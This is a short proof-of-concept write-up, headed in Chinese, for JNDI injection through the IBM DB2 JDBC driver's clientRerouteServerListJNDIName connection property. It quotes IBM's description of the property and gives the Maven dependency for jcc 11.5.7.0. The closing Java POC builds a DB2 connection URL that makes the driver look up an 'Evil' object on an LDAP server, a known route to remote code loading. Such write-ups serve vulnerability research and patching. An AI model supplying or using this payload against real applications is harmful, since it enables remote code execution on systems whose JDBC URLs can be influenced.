## 原理

> clientRerouteServerListJNDINameIdentifies a JNDI reference to a DB2ClientRerouteServerList instance in a JNDI repository of  reroute server information.clientRerouteServerListJNDIName applies only to IBM Data  Server Driver for JDBC and SQLJ type 4 connectivity, and to connections that are  established through the DataSource interface. If the value of clientRerouteServerListJNDIName is not null,  clientRerouteServerListJNDIName provides the following functions: 
>
> • Allows information about reroute servers to persist across JVMs 
>
> • Provides an alternate server location if the first connection to the data source fails

### 依赖

```xml
<dependency>
    <groupId>com.ibm.db2</groupId>
    <artifactId>jcc</artifactId>
    <version>11.5.7.0</version>
</dependency>
```

### POC

```java
Class.forName("com.ibm.db2.jcc.DB2Driver");
DriverManager.getConnection("jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=ldap://127.0.0.1:9999/Evil;");
```

